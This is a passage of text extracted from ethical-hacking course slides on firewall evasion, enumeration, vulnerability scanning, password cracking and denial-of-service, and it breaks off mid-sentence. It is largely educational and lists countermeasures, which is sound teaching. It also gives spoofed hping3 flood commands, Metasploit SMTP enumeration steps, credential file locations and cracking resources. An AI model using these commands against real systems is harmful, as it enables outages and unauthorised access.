scanning\nA stateless firewall will be easier to get past than a stateful one\nA stateless firewall will block SYN packets based on port number\nHowever, it is far less likely to block ACK packets because those could be a response to  an outgoing connection\nPerform separate SYN and ACK scans against the same ports\nIF the SYN shows some ports open and some closed AND the ACK shows all ports unfiltered, the firewall is likely stateless or disabled.\nA stateful firewall will know from its state table if the ACK is legitimate or not\nIf an ACK scan shows at least some ports as “filtered” then it is likely a stateful firewall\nUsed to determine exactly which device permits/blocks a port\nGood for probing past a firewall into an internal network\nCan be used to probe past multiple daisy-chained firewalls\nYou can manipulate the IP TTL in a scan to distinguish between:\nA protected server that does not have that port open\nAn intermediate firewall that blocks the port from being reached by the scanner\nA firewall will return ICMP Type 11, Code 0 (Time Exceeded) if:\nThe port is allowed\nThe probe TTL expires at the firewall\nProbe must be sent to a live final target\nDoes not matter if the final target actually listens on that port\nNmap itself will report the port status as filtered\nIt’s looking for a TCP response, not an ICMP response\nA firewalker will notice the ICMP response and report the port as permitted\nA proxy server is an intermediary between:\nInternal user and Internet resource\nInternet user and internal resource\nUse an online proxy to:\nHide source IP address to avoid discovery\nIncrease privacy\nConduct anonymous hacking attacks\nMask the source of an attack by impersonating a false source\nRemotely access intranets and website resources that are normally protected\nInterrupt all requests sent by a user and re-route them to a different destination, making  it see only the proxy server address\nChain multiple proxy servers to avoid detection\nAKA The Onion Router\nA free and open-source software for enabling anonymous communication\nDirects Internet traffic through a worldwide overlay network\nOver 6000 relays\nConceals a user’s location and usage from network surveillance and traffic analysis\nYour route changes every 10 minutes\nMakes it more difficult to trace Internet activity to the user\nIntended use is to protect personal privacy\nUnfortunately has also become home to “dark web” criminal activity\nA TOR browser aims to make all users look the same\nMaking it difficult to fingerprint you based on your browser or device\nEasy to set up and use\nDownload a TOR browser from https://www.torproject.org/download/\nImplement a software firewall on all devices\nLimit the number of open ports\nBlock ICMP\nConfigure routers to disallow vulnerable features such as source routing and IP  fragments\nUse an IDS/IPS to monitor network traffic\nPatch hosts\nConduct your own scans pre-emptively\nEnsure that the IDS, routers, and firewall firmware are updated to their latest  releases\nConsider using a cloud-based SIEM to leverage more sophisticated/longer term  traffic analysis\nIn a high-security environment, consider hard-coding MAC-to-IP address  mappings for each host\n\nDo not rely on IP-based authentication\nDigitally sign all transmissions\nUse stateful firewalls with deep packet inspection\nDisallow source routing\nDisallow incoming packets that appear to come from your own network\nSpoofed source IP\nBe cautious when allowing traffic based on source port\nHard-code ARP entries where practical\nHard-code IP addresses where practical\nUse switchport security\nSecure DNS server cache against pollution\n\nDisable or change the banner\nDisplay false/misleading banners\nMake sure banner does not advertise the service version\nAdd an “authorized users only” warning to a banner to protect yourself legally\nEspecially for services that require a user to log on\nTurn off unnecessary services\nHide file extensions from web pages such as .asp or .htm\nIIS can use tools like PageXchanger to manage file extensions\nApache can edit httpd.conf with mod_negotiation directives\nUse a multilayer defense strategy\nImplement multiple firewall solutions at different levels\nImplement strong change management\nStay on top of security patches/updates\nSet strong password policies and multifactor authentication\nLook for “side doors” and “back doors” that can bypass the firewall\nWi-Fi access points\nVPN / Remote Access servers\nPrivate WAN links / VPNs to other company sites\n“Sneakernet” (physically moving data in and out of the network on removeable media)\nPerform your own firewall tests to ensure rules behave as desired\nRegularly perform penetration tests\n\n45\nTHANK YOU\nAny Questions!\n",
    "C:\\Users\\UTASI\\OneDrive\\Desktop\\PI\\Ethical Hacking\\Presentation\\Approved_PPT\\Chapter-5Enumeration.pptx": "Chapter-5\u000bEnumeration\nTopics Covered.\n•\tEnumeration Concepts\n•\tNetBIOS Enumeration\n•\tSNMP Enumeration\n•\tNTP and NFS Enumeration\n•\tSMTP and DNS Enumeration\n•\tOther Enumeration Techniques\n•\tEnumeration Countermeasures\n\nThe systematic process of querying a target’s servers and services for information\nThe attacker utilizes information gathered during footprinting / reconnaissance to know which devices and services to query\nWe exploit normal server functionality and protocols to gain more information about our target\nEnumeration should appear to the server as a normal client making legitimate information requests\nYour enumeration test should focus on the information you need\nYou want to avoid returning too much information that will clutter your results\nA combination of manual and automated testing will give the best results\n\n\nWe enumerate to find possible entry points into the target system!\nOS and service details\nUsers and groups\nEmail addresses and contact information\nNetwork resources\nNetwork shares\nRouting tables\nAudit and service settings\nSNMP and DNS information\nMachine names\nApplications and banners\nNetwork Basic Input/Output System\nAn API and Layer 5 protocol\nAllows applications to communicate over a local area network (LAN) with device specific NetBIOS names\n1 - 15 alphanumeric characters (a hidden 16th character describes the name type)\nSpecial characters can only include: - . _ $ (dash, period, underscore, dollar sign)\n$ has special meaning (name or share exists but is hidden on the network)\nOnly the dash is compatible with DNS naming conventions\nUsed by Microsoft for simple LAN communications, name resolution and file sharing\nOriginally used by broadcast-based NetBEUI networking protocol\nMicrosoft later made it a payload of TCP/IP (NetBIOS over TCP)\nTCP 137, 139; UDP 137, 138\nAttackers use the NetBIOS enumeration to obtain\nThe list of computers that belong to a domain \nThe list of shares on the individual hosts in the network\nPolicies and passwords\n\nWindows utility\nDisplays NetBIOS over TCP/IP protocol statistics, NetBIOS name tables for local and remote computers, and the NetBIOS name cache\nnbtstat [-a RemoteName] [-A IPAddress] [-c] [-n] [-r] [-R] [-RR] [-s] [-S] [Interval]\nTool-1 NBTSTAT\nTool-2 NET Commands\nHas 19 sub commands for enumerating information via NetBIOS\nRuns on Linux\nEnumerates NetBIOS information from Windows and Linux SAMBA\nTool-3 ENUM4LINUX\nUsed to centrally monitor devices on a network\nAn SNMP manager polls agents for information\nPolling is done round-robin style, on a regular interval (every few minutes)\nManager is software on a server or workstation\nAgent is small software installed or built into a device OS\nThe manager uses a Management Information Base (MIB) to know what types of information an agent can provide\nA MIB is a set of counters (Object IDs) relevant to the device\nSNMP has several versions that are still in use\nv1, v2, v2c all communicate in clear text\nv3 is encrypted\nNot all devices support v3\nBoth the manager and agent are configured with a simple authentication mechanism called the “community string”\nSimple text string\nAn agent will only respond to a manager that has the same community string\nThere are two default community strings:\n“Public” – for read-only queries\n“Private” – for read/write communications\nMany administrators do not change the default community strings\n\nManaged Device\nRouter, switch, hub, firewall, computer, server service (DHCP, DNS, etc.) printer, IoT device\nAgent\nSoftware installed on managed device\nResponds to the NMS\nNetwork Management System (NMS)\nTypically software installed on a dedicated computer\nManagement Information Base(MIB):- A collection of OIDs stored in a text file\nMost SNMP managers have 2 MIBs already installed\nVendor-neutral MIBs\nVendor-specific MIBs for popular products\nObject Identifier(OID):- Represents a single “question” an SMNP manager can ask an agent \nSNMP MIBS and AGENTS\nSNMP Example\nSNMP Ports:\nUDP 161 - Manager queries and agent replies\nUDP 162 – Agents “raise traps” (send pre-configured alerts) to the manager\nSNMP is a good target for enumeration\nOften the defaults are not changed:\nCommunity strings\nEncryption levels\nMost versions use clear-text communications\nMicrosoft devices don’t even support the encrypted version\nYou might be able to sniff community strings and manager-agent communications\nMany SNMP management tools include a feature to discover all the MIBs installed on the agents\nYou can also “walk” the MIB\nStart at a single common OID\nRepeatedly ask the device to “get-next” until it runs out of OIDs to report on\nNetwork devices\nHosts\nUsers and groups\nServices\nInstalled software\nNetwork shares\nDevice configurations\nIP and MAC addresses\nARP tables\nRouting tables\nVLANs\nPort and interface status\nNetwork traffic\nand much, much more\nsnmpget\nQuery a single OID\nsnmpwalk\nQuery an entire MIB starting from a particular OID\nsnmpget [options] [community string] [host name/address] [OID]\nSnmpget and snmpwalk have the same syntax. Both Windows and Linux use these commands.\n$ snmpget -v 2c 127.0.0.1 -c public .1.3.6.1.2.1.1.5.0 SNMPv2-MIB::sysName.0 = STRING: centos7\n\n$ snmpget -v 2c 127.0.0.1 -c public sysName.0 SNMPv2-MIB::sysName.0 = STRING: centos7\nNetwork Time Protocol (NTP) is used to synchronize clocks of network devices\nUDP 123\nCan maintain time to within 10 milliseconds over the public Internet\nAttackers query NTP for\nList of hosts connected to NTP server\nClients IP addresses, system names, and operating systems\nInternal IP addresses can be acquired if the NTP server is on the DMZ\nActive Directory clients use Windows Time (not NTP) to synchronize their clocks to the domain The Active Directory PDC Emulator domain controller is the time source for the domain.\nIt can synchronize to other sources via NTP.\nNtpdate\nQuery a time server\nntpdate -q pool.ntp.org\nNtptrace\nTraces a chain of NTP servers back to the primary source\nntptrace\nNtpdc\nMonitors operation of the NTP server\nThis example requests the last 600 clients that connected to the NTP time server:\nntpdc -n –c monlist <IP or hostname of time server>\nNTP Time Server Monitor\nNTP Server Scanner\nNmap \nACME client uses SMTP to send email message to email server for acme.com\nLocal email server performs DNS lookup to find MX record and IP address (A/AAAA record) of email server for example.com\nAcme.com email server uses SMTP to deliver message to example.com email server\nExample.com email server puts message into example.com client mailbox\nExample.com client later retrieves message using POP3, IMAP4, HTTP, or even RPC\nPOP\nIMAP HTTP\n\nSMTP\n\nSMTP\n\nSMTP\nInternet\nDNS\nClient\nClient\nMail Server Example.com\n\nMailbox Database\nMail Server Acme.com\nSimple Mail Transfer Protocol (SMTP) has three built-in commands\nVRFY – validates that an email address actually exists for a user\nEXPN – request or expand a mailing list into individual recipients\nRCPT TO – Specifies the actual recipient(s)\nAs an attacker, you can use the SMTP commands manually to enumerate valid email addresses\nTools\ntelnet\nnetcat\nNetScanTool  Pro\nsmtp-user-enum\nsmtp_user_enum.py\nKali iSMTP\nMetasploit auxiliary module smtp_enum\nnmap NSE script smtp-enum-users\ntelnet <email server> 25 vrfy test@example.com\n\nIf you receive a message code 250,251,252:\nThe server has accepted the request and the user account is valid\n\nIf you receive a message code 550:\nThe user account is invalid\nTELNET SMTP\nEnumeration Example\nIn Kali Linux, create a list of possible email addresses and save to your Desktop as user.txt\nOpen Metasploit Framework\nIn the Metasploit console enter these commands:\n\nuse auxiliary/scanner/smtp/smtp_enum set rhosts <email server IP>\nset rport 25\nset USER_FILE /root/Desktop/user.txt exploit\nMetasploit SMTP Enumeration Example\n\n \nNmap\nEnumeration \nExample\nQuery a DNS server for its records:\nA, AAAA                 NS                       MX\nCNAME                 PTR                        SOA\nObtain individual records or “zone transfer” the entire database file\nExploit DNS AXFR (all transfer) vulnerability\nSome DNS servers will transfer their entire zone to any requestor without requiring authentication\nThis saves the attacker time\nYou can also just manually request all the various record types and end up with the same content\nMicrosoft tool for querying DNS\nnslookup [-option] [name | -] [server]\nYou can also install on Linux\nsudo apt install dns-utils\nsudo dnf install bind-utils\nDepends on the existence of a reverse lookup zone to work properly\nEXAMPLE:- \n\nnslookup example.com\nnslookup -type=ns example.com \nnslookup -type=soa example.com \nnslookup -query=mx example.com \nnslookup -type=any example.com \nnslookup examp.com ns1.nsexamp.com \nnslookup 10.20.30.40\nnslookup -type=ptr 96.96.136.185.in-addr.arpa\nTool- nslookup\nDNS Enumeration using Zone Transfer -NSlookup\n*Nix tool for querying DNS\nYou can also install (slightly older version) on Windows\nSyntax:\nThe hacker used DIG to successfully transfer the zone and enumerate the hosts\nAXFR domain.com\nWhat do you see in this exhibit?\n\nWhen possible, use protocols that are encrypted, rather than clear text\nDisable NetBIOS and SMBv1\nChange the SNMP community string\nDisallow DNS zone transfers to unknown servers\nMaintain separate DNS servers for internal and public records (split DNS)\nConsider disabling VRFY and EXPN commands on your email server\nUse file system and share permissions to restrict access to sensitive content\n\n30\nTHANK YOU\nAny Questions!\n",
    "C:\\Users\\UTASI\\OneDrive\\Desktop\\PI\\Ethical Hacking\\Presentation\\Approved_PPT\\Chapter-6Vulnerability Analysis.pptx": "Chapter -6 \u000bVulnerability Analysis\nTopics\nVulnerability Analysis\nVulnerability Assessment Concepts\nVulnerability Classification and Assessment Types \nVulnerability Assessment Solutions and Tools\nVulnerability Assessment Reports\nWhat is vulnerability?\nA weakness that might be exploitable\nCan occur anywhere in the network:\nPeople\nProcesses\nTechnology\nYou can have vulnerabilities that you are not aware of\nYou can have known vulnerabilities that no one has yet created an exploit for\nPopular Tools: OpenVAS, Nessus, Nikto, Acunetix\n\nTypes of  Vulnerability Scanning\nPassive scanning\nObservation\nPassive sniffing\nActive scanning\nSend probes and specially crafted requests to targets\nHost discovery – see what hosts are live\nPort scan and service enumeration – see what open ports, services, and versions exist on the hosts\n“Rattle the doorknob”\nSee if the OS or service responds in a way that suggests it is susceptible to a specific attack\nNeed not include actually launching the attack and compromising the device\nThat is usually done in a penetration test \n\nVulnerability Classification \nMisconfigurations\nNot applying secure settings or configuring per best practices\nNo firewall, no anti-virus, etc.\nLeaving defaults in place\nConfigurations\nPasswords\nServices\nBuffer overflows\nNot patching against known code weaknesses\nUnpatched systems\nNot applying security updates from the vendor\nDesign flaws\nSoftware that had a hurried development process with insufficient built-in security\n\nOperating System flaws\nVulnerabilities discovered in the operating system\nApplication flaws\nVulnerabilities discovered in an application, or services that ship with an OS\nOpen services\nServices that freely permit client connections with no authentication or security controls\nUser-based vulnerabilities\nUser susceptibility to social engineering, lack of training or awareness\nProcess-based vulnerabilities\nSecurity gaps in a business process that might allow exploitation by an attacker\n\nGather information about security trends, threats and attacks\nDiscover system design faults and find weaknesses before an attack\nLearn how to recover from a network attack\nClassify vulnerabilities by:\nPriority\nSeverity\nScope\nStay updated about new products, technologies, and exploits\nCheck underground hacking web sites (Deep and Dark Web sites) for newly  discovered vulnerabilities and exploits\nCheck for news releases on security innovations and product improvements\nVulnerability Scanning\nYou can scan for vulnerabilities and/or compliance, both physical and virtual systems (VMs, containers)\nTools are typically automated and include host discovery and port scanning as part of  the scan\nSome tools only “rattle the door knob” to see if the vulnerability exists\nThey do not attempt to actually exploit the vulnerability\nSome tools also attempt to exploit the vulnerability and provide proof\nSuch as a stolen file, obtaining a shell (command prompt), etc.\nMost tools refer to discovered vulnerabilities by CVE number\nThey provide links to additional information and recommendations\nMost tools have reporting capabilities\nSome tools use standardized output that you can import into another tool for additional  validation\n\nProperties of a Good Vulnerability Scanner\nFollows an inference-based approach\nDetects open ports\nIdentifies services behind the ports\nChecks for vulnerabilities\nValidates vulnerabilities\nCan be automated\nSignature database regularly updated\nSupports different network/host types\nSuggests proper remedies and workarounds\nImitates outside attackers\nCreates actionable, customizable reports\nIncludes trends and categorizes by severity\n\nJust a start -Only one part of a larger penetration test\nTools only look for known signatures\nAutomated tools can produce a lot of false positives\nAutomated tools focus on technology -You will need a skilled pentester to also evaluate vulnerabilities in people and processes\nRequires a pen test to determine if the system can truly be compromised\nCan destabilize fragile systems/interfere with normal operations\nLikely to be incomplete if uncredentialed\nLimitations Of  Vulnerability Scanners\nA multi-purpose framework of specifications supporting:\nAutomated configuration\nVulnerability and patch checking\nTechnical control compliance\nSecurity measurement\nUsed by the NVD(The NVD is the U.S. government repository of standards based vulnerability management data represented using the Security Content Automation Protocol (SCAP). This data enables automation of vulnerability management, security measurement, and compliance.)\nSCAP is an industry standard\nSCAP scanners are typically used to test a system for compliance\nUsually includes:\nDashboard with summaries\nDetails for each device\nOutput for both physical and virtual hosts\nDevice names, types, IP addresses, MAC addresses\nDevice OS version\nOpen TCP and UPD ports\nInstalled applications and services\nDiscovered vulnerabilities, insecure default settings and misconfigurations\nAccounts with weak or default passwords\nFiles and folders with weak permissions\nTechnology- or device-specific issues\nMissing patches and hotfixes\nEnd-of-Life / End-of-Service software information\nHigher-end scanning tools will separate the report into:\nExecutive summary\nTechnical details\nMay include CVE and CVSS references\nShould include recommendations to correct/mitigate discovered issues\n\nScan Result’s can be…\nTrue Positive\nThe scanner detects a vulnerability\nThe vulnerability actually exists on the scanned system\nThe scan did its job!\nTrue Negative\nThe scanner does not detect a vulnerability\nThe vulnerability really does not exist on the scanned system\nThis is our preferred result!\nFalse Positive\nThe scanner detects a vulnerability\nBut the vulnerability does not actually exist on the scanned system\nToo many of these can be annoying!\nFalse Negative\nThe scanner does not detect a vulnerability\nBut the vulnerability actually exists on the scanned system\nThis is the worst result!\n\n\n\nYou can perform vulnerability scans to identify weaknesses or lack of compliance\nScanning can be passive or active\nVulnerability scanning tools can focus on hosts, network devices, cloud services, or  applications\nCredentialed scans typically provide more information than uncredentialed scans\nSCAP scans are used to test a system for compliance\nScan results can return four different types of results:\nTrue positive – there really is a vulnerability\nTrue negative – there really is no vulnerability\nFalse positive – the scanner reports vulnerabilities that do not actually  exist\nFalse negative – the scanner fails to report vulnerabilities that actually  exist\nVulnerability assessment should include both technical and non-technical targets  (people, processes)\nA vulnerability assessment should produce an actionable report\nCommon Vulnerability Scoring System (CVSS) ranks vulnerability severity on a scale  of 1-10\nCVSS identifies four attack vectors: network, adjacent, local, physical\n\nThe National Vulnerability Database is a central repository of  vulnerability information\nCommon Vulnerabilities and Exposures (CVE) is an identification  system used to precisely identify a specific vulnerability\nCVEs are used by both malicious and ethical hackers\nVulnerability research should be an ongoing process\nThere are many sites and services dedicated to providing the latest  vulnerability information\n\n18\nTHANK YOU\nAny Questions!\n",
    "C:\\Users\\UTASI\\OneDrive\\Desktop\\PI\\Ethical Hacking\\Presentation\\Approved_PPT\\Chapter-7_Password Cracking.pptx": "\u000bChapter-7 \u000b\u000bSystem Hacking- Password Cracking\nTopics\nPassword Cracking\nTypes of Password attacks\nNon-Electronic Attacks\nActive online attacks\nDefault passwords\nPassive online attacks\nOffline rainbow table attack\nPassword cracking tools\nPassword salting\nCountermeasures against password cracking\nBuffer overflow attack\nPassword  \nPasswords are a system designed to provide authentication. There are many different ways to authenticate system users:\n* a user can present a physical object like a key card, prove identity using a personal characteristic like a fingerprint, or use something that only the user knows.\nPassword Strength\nDetermined by length and complexity\nComplexity is defined by number of character sets used\nlower case, upper case, numbers, symbols, etc.\nShort passwords (e.g., 4-digit PIN) can be brute forced in a few seconds\nEach additional character adds orders of magnitude to cracking time\nCheck how long it would take to crack a password:\nhttps://www.security.org/how-secure-is-my-password/\nA salt is additional random data added to a user’s password before it is hashed\nIt lengthens the password, making it harder to crack\nSalts should be unique to each user, and never reused\nSalting the Hash\nWhere Passwords are stored?\nUnix Password File\nUnix-based file systems the password file is located at /etc/passwd or /etc/shadow\nWindows Password File\nThe password file for Windows, known as the Security Accounts Manager (SAM) file, is located in C:\\windows\\system32\\config\\sam. \n\nActive Directory (ntds.dit):- C:\\Windows\\NTDS\nContains OS user passwords in hashed format\n44EFCE164AB921CQAAD3B435B51404EE  B757BF5C0D87772FAAD3B435B51404EE\n\n\nIf you see this pattern, you know  it’s LM with a password < 7 chars\nAdministrator:500:\naad3b435b51404ee\naad3b435b51404ee\n:b9728a84efe05e76bda49646b6ec25bb:::\nUsername\nSID\nLM Hash\nNT (NTLM) Hash\n\nAll NULL LM hash = this system does not use LM!\nWindows SAM File\nPassword Cracking \nPassword cracking techniques are used to recover passwords from computer systems\nAttackers use password-cracking techniques to gain unauthorized access to vulnerable systems\nMost of the password cracking techniques are successful because of weak or easily guessable passwords\n\nHashes\nPasswords are usually not stored in clear text but mostly in hashed format. \nHashes are one-way cryptographic functions that are not meant to be decrypted\nTo crack password hashes: \nObtain the password hashes\nDetermine the hashing algorithm\nHash each password you wish to try using the same algorithm\nCompare your result to the stored hash\nIf they are the same, you found that password\n\nTypes of Password Attacks\nActive online attacks\nDictionary\nBrute forcing\nPassword spraying\nHashdump\nKeylogging\nMITM\nPassive online attacks\nSniffing\n\nOffline attacks\nRainbow table attack\nMany online cracking tools can also work for offline cracking\nGrab a copy of the password database/file and start cracking!\nTypes of Password Attacks\nNon-electronic attacks\nSocial engineering - most effective\nShoulder surfing\nDumpster diving\nSnooping around\nGuessing\nRubber host (coercion)\nCan be very slow and CPU intensive\nConsider using a dedicated Graphics Processing Unit (GPU) to offload the work\nDedicated GPUs are designed to conduct complex mathematical functions extremely  quickly\nUsing a rainbow table (dictionary of pre-computed hashes) can dramatically speed  up password cracking\nDictionaries and rainbow tables can be very large in size\nYou can also upload the hash to an online service\nSome are free\nSome charge a fee\n\nDictionary Attack\nAn attack in which a password-cracking tool goes through a list of words (dictionary)  until it either\n Find the password or exhaust the list\n\nPractical limitations:\nMust know user name, though user names can also be in wordlists\nLists can become unwieldy in their size (1.5 billion words ≈ 15 GB uncompressed)\nLockout policies could significantly slow you down or lock the account\nCan be online or offline\nMethod to implement Dictionary Attack?\nDownload Password Dictionaries\nhttps://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm\nhttps://apasscracker.com/dictionaries/\nhttps://github.com/topics/password-list\nGitHub danielmiessler/SecLists\nSteal copy of file or database containing credentials (offline cracking)\nInduce system to dump hashed passwords\nIntercept authentication and send to a password cracker\nRun cracker against network service without lockout\nRun cracker against accounts exempt from lockout (e.g., admin/root)\nBrute Force Attack\nUsed if the dictionary does not contain the password\nTries combinations of every character, number and special character until the password is found\nIs the slowest and most resource-intensive\nMany password-cracking tools include online brute-forcing capabilities \nThe dictionary attack is considered to be a specific type of brute force  attack\nRainbow Table Attack\nA Rainbow Table Attack is an attack in which passwords in the wordlist have been  pre-computed into their corresponding hashes, then compressed in a highly  efficient manner\nVery fast with minimal computation, but at the cost of a very large table\n64 GB of a rainbow table can contain around 70 trillion hashes\n64 GB of a wordlist can only contain around 6.5 billion passwords\nPassword crackers that can use rainbow tables include Ophcrack, RainbowCrack,  and mitre.org’s CAPEC\nSites to Download Rainbow Table from GitHub\nproject-rainbowcrack.com\nfreerainbowtables.com\nophcrack.sourceforge.net/tables.php\n\nPassword Spraying\nA brute force variant\nThe same password is “sprayed” across many accounts\nAs opposed to many passwords being tried against a single account\nIs used to circumvent common brute forcing countermeasure such as account  lockout\nIf none of the accounts uses the password, then another password is sprayed\nOnline Password Cracking Sites\nonlinehashcrack.com\ncrackstation.net\ngpuhash.me\nmd5decrypt.net\nDefault passwords\nWhat Are Default Passwords?:- Factory default software configurations for embedded systems, devices, and appliances often include simple, publicly documented passwords. Default passwords are intended for initial testing, installation, and configuration operations, and many vendors recommend changing the default password before deploying the system in a production environment.\n\nWhat Is the Risk?: - Attackers can easily obtain default passwords and identify internet-connected target systems. Passwords can be found in product documentation and compiled lists available on the internet.  \nLink to search Default Passwords\nopen-sez.me\nwww.fortypoundhead.com\ncirt.net\nwww.defaultpassword.us\ndefaultpasswords.in\nGitHub lists 95 repos that list default and hard-coded passwords\nPassive Online Attack -Sniffing\nUse a sniffer such as Wireshark\nCapture clear text credentials\nOnly works if the sniffer is on the same shared network segment\nUse an ARP poisoner such as ettercap to capture login session\nUse Wireshark to capture clear text passwords\nUse Cain & Abel to ARP poison, capture and crack password hash\nARP Poisoning \nNon-Electronic Attack\nNon-electronic, or non-technical, attacks don’t require technical knowledge of methods of system intrusion. \nThere are four kinds of non-electronic attacks: social engineering, shoulder surfing, keyboard sniffing, and dumpster diving.\nDumpster Diving\nGoing through someone's trash to find treasures like discarded sensitive information that could be used in an illegal manner. Information that should be securely discarded includes, but not limited to :- \n\nShoulder surfing\nA term used to describe a person who looks over another person's shoulder as they enter data into a computer or other device. For example, someone might shoulder surf when you are entering your computer password, ATM pin, or credit card number. Criminals often use this technique to gain access to your personal accounts or read personal information, such as e-mails.\nSocial \u000bEngineering \nBuffer Overflow Attack\nA buffer overflow condition exists when a program attempts to put more data in a buffer than it can hold or when a program attempts to put data in a memory area past a buffer. In this case, a buffer is a sequential section of memory allocated to contain anything from a character string to an array of integers. \nWriting outside the bounds of a block of allocated memory can corrupt data, crash the program, or cause the execution of malicious code.\n\nTools and Links\nHASHCAT v3.6 (or newer): https://hashcat.net/hashcat/\nJOHN THE RIPPER (v1.8.0 JUMBO) : http://www.openwall.com/john/\nPACK V0.0.4 (Password Analysis and Cracking Toolkit): http://thesprawl.org/projects/pack/\nHashcat-utils v1.7: https://hashcat.net/wiki/doku.php?id=hashcat_utils\n\nAdditionally, you will need dictionaries/wordlists and highly recommend the below sources:\nWEAKPASS DICTIONARY: https://weakpass.com/wordlist\nCRACKSTATION DICTIONARY: https://crackstation.net/buy-crackstation-wordlist-password-crackingdictionary.htm\nSKULL SECURITY WORDLISTS:  https://wiki.skullsecurity.org/index.php?title=Passwords\nPassword Cracking Countermeasures\nSet a password policy including history, length, complexity, and  minimum/maximum age\nDo not use passwords such as date of birth, spouse/child/pet’s name\nMonitor for local and network-based dictionary/brute-forcing\nPrefer long passphrases over shorter complex passwords\nAvoid clear text protocols.\nEnable SYSKEY or BitLocker on Windows to protect the SAM database\nEmploy two-factor authentication such as:\nSmart card + PIN\nBiometrics and password\n\n33\nTHANK YOU\nAny Questions!\n",
    "C:\\Users\\UTASI\\OneDrive\\Desktop\\PI\\Ethical Hacking\\Presentation\\Approved_PPT\\Chapter-8-DOS.pptx": "System Hacking-Denial\u000bof Service attack\nTopics\nDOS / DDOS Concepts\nDOS / DDOS Attack Techniques\nBotnets\nDOS/ DDOS Attack Tools\nCountermeasures\nDOS/DDOS Protection Tools\nWhat is denial Of Service(DoS)\nA type of attack on a service that disrupts its normal function and prevents other  users from accessing it\nTypically aimed at a website, but can attack whole networks, a specific server, or a  specific application\nDoS can be achieved by:\nFlooding the network or routers/switches with traffic (consuming all network bandwidth)\nConsuming all of a server’s CPU, RAM or disk resources\nConsuming all of a server’s permitted concurrent TCP connections\nDoS attacks can cause the following problems:\nIneffective services\nInaccessible services\nInterruption of network traffic\nConnection interference\nDos Example\nDDoS Example\nHacker Computer\nDistributed Denial of Service(DDoS)\nLaunched from numerous compromised devices\nThere can be hundreds or even thousands of devices\nThe compromised devices are typically organized and remotely controlled\nSuch computers are called “zombies”\nThey are managed by “command and control” (C&C) computers\nThese are regionally located\nOften compromised machines themselves\nThe C&C computers are in turn controlled by the attacker’s computer\n\nDoS Types/ Attack Techniques\nVolumetric Attacks\nDesigned to consume network bandwidth so authorised clients cannot connect\nFragmentation Attacks\nDesigned to keep a target busy with packet fragments that cannot be reassembled\nState-Exhaustion Attacks\nDesigned to consume connection state tables in network infrastructure components\nApplication Layer Attacks\nDesigned to consume app resources/service so they are not available to users\nProtocol Attacks\nDesigned to abuse commonly used Internet protocols\nMulti-vector Attacks\nA combination of attack types\n\nVolumetric Attacks\nCommon types of Volumetric Attack are :\nPacket Flood\nBotnet DDoS\n Smurf, ICMP Flood, Fraggle\nHTTP Flood\n\nPacket Flood:- Send massive amounts of TCP, UDP, ICMP, or random packet traffic to target. Can include different TCP flag variants.\nBotnet DDoS Attack:- Service request flood. The attacker/zombie group sets up/tears down TCP connections in an attempt to use up all server resources. A request is initiated on each connection. The flood of service requests overwhelms the target server(s)\nHTTP Flood:- Uses seemingly legitimate HTTP GET or POST requests to attack a web server. Does not require spoofing or malformed packets. Can consume a high amount of resources with a single request\n\n\nSmurf Attack:- Large numbers of ICMP echo requests are sent to intermediate devices. The source is spoofed so they all respond to the target\nUse hping3 to perform this attack:\nhping3 -1 -c 1000 10.0.0.$i --fast -a <spoofed target>\nICMP Flood:- Similar to Smurf but without the intermediate devices. Send ICMP Echo packets with a spoofed address, eventually reach the limit of packets per second sent\nUse hping3 to perform an ICMP flood:\nhping3 -1 --flood --rand-source <target>\nFragile Attack:- Same concept as Smurf attack.  But UDP packets instead of ICMP (UDP flood attack)\nUse hping3 to perform this attack:\nhping3 --flood --rand-source --udp -p <target>\nFragmentation Attacks\nCommon types of Fragmentation attacks are:\nFragmentation\nTeardrop\nUDP and TCP Fragmentation\nPing of Death\n\nFragmentation Attack\nDesigned to keep a target busy with packet fragments that cannot be reassembled\nIP fragments are sent to a target\nTheir fragment offsets overlap or otherwise cannot be reassembled\nThe target’s CPU is kept busy attempting to reassemble the packets\nCan result in system freezing or crash\n\nPing To Death\nFragments ICMP messages\nUpon reassembly the ICMP packet is larger than the maximum allowable size\nCrashes the target\n\nTCP Fragmentation\nSimilar to an IP fragmentation attack, but for TCP\nSend the target TCP segments that have overlapping sequence numbers and  cannot be reassembled\nWindows NT, Windows 95, and Linux versions prior to version 2.1.63 are most  vulnerable\n\nUDP Fragmentation\nSend the target UDP fragments\nWhen reassembled they are too large for the network's MTU\n\nTeardrop Fragmentation Attack\nAn IP fragmentation attack\nIP fragment offset in the packet headers overlap\nOffset starts  too  soon  \nOverlaps with the previous packet\nState Exhaustion Attack\nCommon types of State Exhaustion Attack are \nTCP State Exhaustion\nSyn Flood\nSSL/TLS Exhaustion\nDNS/NXDOMAIN Flood\n\nTCP State Exhaustion Attack\nAttempts to consume all permitted connections\nTargets can include:\nApplication servers/web servers\nLoad balancers or firewall\n\nSSL/TLS Exhaustion Attack\nSend garbage SSL/TLS data to the server\nServer runs out of resources attempting to process corrupt SSL handshakes\nFirewalls generally cannot distinguish between legitimate and phony SSL data\n\nDNS Flood\nThe attacker floods the DNS server  with requests for invalid or  nonexistent records\nThe DNS server spends its time  searching for something that  doesn't exist\nInstead of serving legitimate  requests\nThe result is that the cache on the  DNS server gets filled with bad  requests\nClients can't find the sites/servers  they are looking for\nAKA Half-open attack\nSend thousands of SYN packets to a target\nSource address is spoofed to non-existent devices\nThe server replies with SYN/ACK to non-existent source\nNo ACK is received to complete the handshake\nThe server must wait to time out each connection\nServers are usually configured to allow a limited number of concurrent connections\nAll permitted connections are consumed\nLegitimate client requests are ignored\n\nSYN Flood\nApplication Layer Attacks\nAbuse Layer 7 protocols such as HTTP/HTTPS, SNMP, SMB\nExploit weak code\nConsume resources necessary for the application to run\nMeasured in Requests per second (Rps)\nSlow rate, consume few network resources, but harmful to the target\nImitate legitimate user activity\nTarget file servers, web servers, web applications and specific web-based apps\nCommon attack examples:\nHTTP GET/POST attack\nSlowloris or R.U.D.Y (low and slow) attack\nMalformed SMB requests\nMalicious SQL queries that disrupt a database server\n\nProtocol Attacks\nRely on weakness in Internet communications protocols\nBecause many of these protocols are in global use, changing how they work is  complicated and very slow to roll out\nTheir inherent complexity might introduce new flaws as the original flaws are fixed\nCommon Types of Protocol Attacks are \nBGP Hijacking\nLAND Attack Etc.\nDoS and DDoS Tools\nKali Slowloris\nDDoSIM\nOWASP HTTP POST\nRUDY\nTor’s Hammer\nDAVOSET\nGoldenEye\nHULK \n\n\nCountermeasures\n Use cloud-based anti-DDoS services to protect enterprise-level online 